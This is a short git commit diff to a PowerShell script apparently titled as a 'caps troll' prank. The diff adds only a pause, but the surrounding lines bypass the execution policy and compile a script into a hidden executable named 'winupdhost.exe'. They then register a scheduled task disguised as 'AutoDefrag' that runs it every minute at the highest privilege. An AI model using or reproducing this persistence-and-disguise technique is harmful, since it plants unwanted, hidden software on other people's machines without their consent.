bd1456483bbb0b106f6a874a328326c950f03e23
TobiS137 <75208393+TobiS137@users.noreply.github.com>
2025-03-27 22:26:24 +0100

    Update cAps-TroLl-v3.ps1

--- cAps-TroLl-v3/cAps-TroLl-v3.ps1
+++ cAps-TroLl-v3/cAps-TroLl-v3.ps1
@@ -5,5 +5,6 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass;
 Import-Module ps2exe;
 Start-Sleep 1;
 ps2exe.ps1 raw.ps1 winupdhost.exe -noConsole;
+Start-Sleep 1;
 schtasks /create /tn "AutoDefrag" /tr "$env:Temp\winupdhost.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
 exit
